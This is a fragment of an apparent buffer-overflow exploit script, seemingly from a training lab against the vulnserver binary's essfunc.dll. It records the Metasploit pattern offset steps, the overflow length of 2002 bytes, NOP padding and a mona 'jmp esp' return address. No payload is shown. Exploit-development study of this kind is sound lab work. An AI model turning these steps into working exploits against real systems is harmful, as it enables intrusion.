...
# msf-pattern_create -l 5000 > pattern_5k.txt
# 5k pattern 6f43376f
# msf-pattern_offset -l 5000 -q 6f43376f
# [*] Exact match at offset 2002
overflow = b"\x90" * 2002

# jmp esp (!mona jmp -r esp "essfunc.dll")
# Message=  0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\hnp\Desktop\essfunc.dll)
